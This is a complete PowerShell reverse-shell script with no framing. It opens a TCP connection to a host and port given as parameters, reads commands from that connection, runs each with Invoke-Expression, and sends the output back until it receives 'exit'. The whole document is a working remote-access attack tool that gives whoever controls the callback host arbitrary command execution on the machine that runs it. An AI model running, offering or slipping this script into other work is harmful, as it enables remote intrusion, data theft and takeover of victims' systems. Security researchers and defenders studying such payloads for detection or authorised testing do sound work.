param(
    [Parameter(Mandatory=$true)][string]$CallbackHost,
    [ValidateRange(1,65535)][int]$CallbackPort = 443
)
$socket = New-Object System.Net.Sockets.TcpClient($CallbackHost, $CallbackPort)
try {
    $stream = $socket.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($stream)
    while ($null -ne ($command = $reader.ReadLine())) {
        if ($command -eq 'exit') { break }
        try { $result = Invoke-Expression $command 2>&1 | Out-String }
        catch { $result = $_ | Out-String }
        $writer.WriteLine($result)
    }
}
finally {
    if ($reader) { $reader.Dispose() }
    if ($writer) { $writer.Dispose() }
    $socket.Close()
}
